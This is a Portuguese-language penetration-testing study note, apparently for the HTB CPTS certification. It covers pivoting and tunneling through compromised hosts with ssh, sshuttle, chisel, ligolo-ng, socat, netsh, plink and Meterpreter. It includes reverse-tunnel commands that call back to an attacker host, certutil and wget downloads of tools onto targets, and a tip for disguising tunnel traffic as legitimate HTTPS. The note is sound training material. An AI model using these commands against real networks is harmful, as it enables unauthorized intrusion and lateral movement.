---
tema: Pivoting e Tunneling
tópico: Movimento lateral através de hosts comprometidos e redirecionamento de portas
tags: [htb, cpts, pivoting, tunneling, proxychains, chisel, ligolo, ssh, socat, port-forwarding]
dificuldade: medium
---

# CPTS 12 — Pivoting, Tunneling and Port Forwarding

> [!info] Objetivo
> Usar um host comprometido como ponte para alcançar redes internas que não têm rota a partir da sua máquina. Dominar forward/reverse, SOCKS, port forwarding e a diferença entre ligar-se a um serviço existente e publicá-lo para a sua máquina.

## 🎯 Quando usar

- Scan inicial mostra **apenas uma interface externa** e o host comprometido tem segunda NIC com rede `/24` invisível.
- Serviço interno escuta em `127.0.0.1` (ex.: painel admin em `localhost:8080`).
- Só há saída de rede pelo alvo (egress filtering) e você precisa de **reverse**.
- Precisa rodar ferramentas locais (nmap, ffuf, impacket) contra rede interna → SOCKS.

## 🧰 Ferramentas

| Ferramenta | Modelo | Melhor para |
|---|---|---|
| `ssh -L` | forward | Publicar um serviço interno na sua máquina |
| `ssh -R` | reverse | Expor serviço seu para uma rede interna |
| `ssh -D` | SOCKS5 | Navegar toda a rede interna com proxychains |
| `proxychains` | wrapper | Encapsular nmap, impacket, ffuf em SOCKS |
| `chisel` | HTTP tunnel | Pivot quando só há HTTP/HTTPS liberado |
| `ligolo-ng` | TUN interface | Pivot "transparente", sem proxychains |
| `socat` | relay | Redirecionar porta pontual, sem SSH |
| `sshuttle` | VPN sobre SSH | Roteamento de sub-redes via SSH |
| `netsh portproxy` | Windows nativo | Forward em host Windows sem ferramentas |
| `plink.exe` | SSH Windows | Reverse/forward a partir de Windows |
| `meterpreter route` | autoroute | Pivot dentro do Metasploit |

## 🔁 Tabela cenário → técnica

| Cenário | Técnica |
|---|---|
| Tenho SSH no host comprometido | `ssh -L`, `-R`, `-D`, `sshuttle` |
| Não tenho SSH, só HTTP/HTTPS de saída | `chisel` reverse |
| Quero roteamento transparente, sem SOCKS | `ligolo-ng` |
| Windows sem admin, sem instalar nada | `netsh portproxy` (precisa admin) ou `plink` |
| Só uma porta específica importa | `socat` |
| Já estou no Metasploit | `autoroute` + `socks_proxy` |
| Preciso alcançar rede atrás de um segundo salto | double pivot com chisel/ligolo encadeado |

## ➡️ SSH Local Port Forward (`-L`)

```bash
# Publica 127.0.0.1:8080 do alvo como localhost:8080 na minha máquina
ssh -L 8080:127.0.0.1:8080 <USUARIO>@<IP>
# Agora: curl http://127.0.0.1:8080 atinge o painel interno do alvo
```

## 🔄 SSH Remote Port Forward (`-R`)

```bash
# Meu /usr/share/windows/windows-binaries é servido dentro da rede do alvo via 4455
ssh -R 4455:127.0.0.1:8000 <USUARIO>@<IP-comprometido>
# No alvo: wget http://127.0.0.1:4455/nc.exe

# Reverse para rede sem rota direta: expor minha porta a partir do jump
ssh -R 9050:127.0.0.1:9050 <USUARIO>@<JUMP> -N -f
```

**Quando usar:** quando o alvo **não consegue** iniciar conexão para a internet, mas você tem SSH nele.

## 🧦 SOCKS Dinâmico (`-D`)

```bash
ssh -D 9050 <USUARIO>@<IP> -N -f        # SOCKS5 em localhost:9050

cat >> /etc/proxychains.conf <<'EOF'
socks5 127.0.0.1 9050
EOF

# Teste de rota
proxychains curl http://<IP-INTERNO>/
proxychains nmap -sT -Pn -p 80,445,3389 <IP-INTERNO>   # -sT: TCP connect, -Pn: sem ICMP
```

> [!warning] SOCKS não fala ICMP
> Ping e `nmap -sn` falham através de proxychains. Use `-sT -Pn` para scan e validação HTTP para confirmar host vivo.

Para ferramentas que não respeitam SOCKS (ex.: `impacket` já respeita via `proxychains`):

```bash
proxychains psexec.py <DOMINIO>/<USUARIO>:<SENHA>@<IP-INTERNO>
proxychains ffuf -u http://<IP-INTERNO>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

## 🌐 sshuttle

```bash
# Roteia a sub-rede interna como se fosse local — sem proxychains
sshuttle -r <USUARIO>@<IP> <SUBREDE-INTERNA>/24
# Outra forma (excluindo rotas locais)
sshuttle -r <USUARIO>@<IP> 172.16.5.0/24 -x 172.16.5.1
```

**Quando usar:** você tem SSH e quer usar `nmap -sS`, browsers e qualquer ferramenta sem adaptação. Requer root (iptables).

## 🧱 chisel (HTTP/S tunneling)

```bash
# Atacante: servidor, com verificação desabilitada para autossigned
chisel server -p 8000 --reverse

# Alvo: conecta de volta e abre SOCKS5 em 1080 na minha máquina
./chisel client <IP-ATACANTE>:8000 R:socks

# Forward simples de porta via chisel
./chisel client <IP-ATACANTE>:8000 R:3306:127.0.0.1:3306
```

```bash
# Transferir o binário (Linux/Windows)
# Atacante
python3 -m http.server 80
# Alvo Windows
certutil -urlcache -f http://<IP-ATACANTE>/chisel.exe C:\Windows\Temp\chisel.exe
```

**Quando usar:** só há HTTP/HTTPS liberado ou você está atrás de proxy corporativo. Um único binário, dois sentidos.

## 🥞 ligolo-ng (interface TUN)

```bash
# Atacante: criar interface e subir o proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Alvo (agent) conecta de volta
./agent -connect <IP-ATACANTE>:11601 -ignore-cert

# No console do ligolo: selecionar e iniciar o túnel
session          # lista agentes
ifconfig         # mostra redes que o agente vê
start            # ativa a interface

# Adicionar rota para a rede interna
sudo ip route add 172.16.5.0/24 dev ligolo
```

**Quando usar:** pivot "de verdade": sem SOCKS, sem proxychains, latência baixa, suporta scan pesado (`nmap -sS`) e ferramentas que abrem conexões próprias.

## 🔀 socat

```bash
# Relay de porta: receber em 8080 e entregar à rede interna
socat TCP-LISTEN:8080,fork TCP:172.16.5.10:80

# Reverse: o alvo conecta e você serve a porta
socat TCP-LISTEN:4444,fork TCP:127.0.0.1:80

# Encaminhar UDP (ex.: DNS)
socat UDP-LISTEN:5353,fork UDP:172.16.5.10:53
```

**Quando usar:** quando SSH/chisel não estão disponíveis, ou você só precisa de uma porta única.

## 🪟 Windows: netsh e plink

```powershell
# Port proxy nativo — requer admin. Publica serviço interno em 0.0.0.0:8080
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
  connectport=8080 connectaddress=<IP-INTERNO-VIZINHO>

netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Liberar no firewall
netsh advfirewall firewall add rule name="pivot8080" dir=in action=allow protocol=TCP localport=8080
```

```cmd
:: plink — reverse tunnel de Windows para minha máquina
plink.exe -ssh -l <USUARIO> -pw <SENHA> -R 9050:127.0.0.1:9050 <IP-ATACANTE>
:: Aceitar a chave do host na primeira conexão: -hostkey ou echo y | plink ...
```

**Quando usar:** `netsh` quando você tem admin no Windows e quer publicar um serviço *para a frente* (atacante → alvo → interno). `plink` para o caminho inverso sem instalar cliente SSH.

## 💥 Meterpreter

```msf
# Descobrir redes visíveis ao host comprometido
ipconfig
# Autorizar rota para a rede interna
run autoroute -s 172.16.5.0/24
# Subir SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run -j
# Então usar proxychains normalmente
```

## 🧭 nmap através de proxy

```bash
# Via SOCKS (proxychains): sempre TCP connect
proxychains nmap -sT -Pn -n --top-ports 100 <IP-INTERNO>

# Scan leve para não derrubar o túnel
proxychains nmap -sT -Pn -p 22,80,445,3389 <IP-INTERNO> -T2

# Sem proxychains (ligolo/sshuttle): scan normal, com SYN e ICMP
sudo nmap -sS -sC -p- <IP-INTERNO>
```

## 🔂 Double Pivot

```bash
# Salto 1: chisel server na minha máquina; Pivot1 conecta com SOCKS
chisel server -p 8000 --reverse
./chisel client <ATACANTE>:8000 R:socks                 # SOCKS em 1080

# Salto 2: via Pivot1, subir outro chisel server alcançável pelo Pivot2
proxychains ./chisel server -p 9000 --reverse
# Pivot2 conecta ao Pivot1 (que está na rede do meio)
./chisel client <IP-PIVOT1-INTERNO>:9000 R:1081:socks
```

Em seguida, no `proxychains.conf`, declare os dois SOCKS em cadeia (`strict_chain`):

```
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

**Alternativa mais limpa:** encadear dois agentes ligolo-ng (um por salto) e adicionar uma rota `ip route add` por sub-rede.

## ⚠️ Pegadinhas

- **SOCKS não carrega ICMP**: esqueça `ping` e `nmap -sn`. Use `-Pn`.
- **`-sS` não funciona por SOCKS**: precisa `-sT`.
- **DNS vaza pelo resolver local**: habilite `proxy_dns` no proxychains.
- **`ProxyChains-3.1`** no output significa que funcionou; se não aparecer, sua config não foi lida (`/etc/proxychains.conf` vs `proxychains4.conf`).
- **Túnel cai com scan agressivo** (`-T4`): use `-T2` e `--max-retries 1`.
- **ligolo precisa de rota** (`ip route add`) ou interface TUN ativa — `start` sem rota não resolve nada.
- **`netsh portproxy` exige admin** e o serviço `iphlpsvc` rodando; teste com `telnet`.
- **Chisel reverse (`R:`) vs normal**: `R:socks` é do ponto de vista do cliente (o servidor recebe a porta).
- **Ferramentas que não respeitam SOCKS** (alguns binários estáticos) → use ligolo/sshuttle.
- **Filtro de saída**: se só 443 sai, rode chisel em 443 com TLS (`--tls`) para parecer tráfego legítimo.

## ✅ Checklist rápido

- [ ] `ipconfig`/`ip a` e `route print`/`ip route` no host comprometido: quais redes existem?
- [ ] Testar conectividade atacante → host comprometido → rede interna (porta a porta)
- [ ] Escolher técnica pela saída disponível (SSH? HTTPS? nada?)
- [ ] Subir túnel, validar com `curl` ou `nmap -sT -Pn` em um host conhecido
- [ ] Ajustar proxychains (chain + proxy_dns) antes de rodar ferramentas
- [ ] Scan interno com TCP connect e ritmo baixo
- [ ] Documentar sub-redes descobertas, senhas e hostnames internos
- [ ] Derrubar túneis ao terminar (limpar `ip route`, processos, regras `netsh`)

## 🔗 Relacionado

- [[CPTS 07 - File Transfers]]
- [[CPTS 09 - Using the Metasploit Framework]]
- [[Fase 08 - Pivoting e Tunneling]]
- [[Fase 03 - Reconhecimento de Rede]]
- [[CPTS 13 - Active Directory Enumeration and Attacks]]
